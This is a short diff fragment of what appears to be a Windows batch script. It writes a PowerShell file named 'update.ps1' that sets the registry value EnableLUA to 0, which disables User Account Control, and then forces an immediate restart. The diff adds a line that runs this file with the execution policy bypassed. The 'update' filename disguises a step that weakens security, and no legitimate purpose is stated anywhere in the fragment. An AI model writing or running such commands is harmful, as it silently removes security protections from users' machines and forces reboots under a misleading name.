@@ -31,9 +31,11 @@ Shutdown /r /f /t 0
 
 echo Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0; Shutdown /r /f /t 0 > "C:\Windows\Temp\update.ps1"
 
+powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1
 
 
 echo Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0 ^& Shutdown /r /f /t 0 > C:\Users\joe\update.ps1
+
 
 
 
